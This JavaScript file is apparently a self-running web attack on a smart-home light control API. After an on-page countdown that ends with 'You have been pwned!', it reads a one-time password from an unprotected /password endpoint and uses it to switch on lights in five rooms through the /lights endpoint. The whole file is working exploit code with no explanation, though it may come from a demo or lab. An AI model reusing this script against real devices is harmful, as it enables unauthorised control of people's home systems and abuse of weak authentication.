function attackRoom(hostname, room) {
    var url = "http://"+hostname+"/password";
    var http = new XMLHttpRequest();
    http.open("GET", url, false);
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
            otp = JSON.parse(this.responseText).otp;
            console.log(otp);
            turnLightsOn(hostname, room, otp); 
        }
    };
    http.onerror = function() {
        console.log("failed");
    };
    http.send();
}

function turnLightsOn(hostname, room, otp) {
    var url = "http://"+hostname +"/lights?room="+room+"&value=true&otp="+otp;
    var http = new XMLHttpRequest();
    http.open("POST", url, false);
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
            console.log(this.responseText);
        }
    };
    http.onerror = function() {
        console.log("failed");
    };
    http.send();
} 

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function launchAttack() {
    var hostname = window.location.hostname;
    console.log('Launching attack against ' + hostname);
    await sleep(500);
    attackRoom(hostname, "hallway");
    attackRoom(hostname, "kitchen");
    attackRoom(hostname, "bedroom");
    attackRoom(hostname, "livingroom");
    attackRoom(hostname, "bathroom");
    console.log('Attack finished!');
}

var countdown = 10;
var timer = setInterval(function(){
    if(countdown <= 0){
        clearInterval(timer);
        document.getElementById("timer").innerHTML = "You have been pwned!";
        launchAttack();
    }
    else {
        document.getElementById("timer").innerHTML = countdown;
        countdown -= 1;
    }
}, 1000);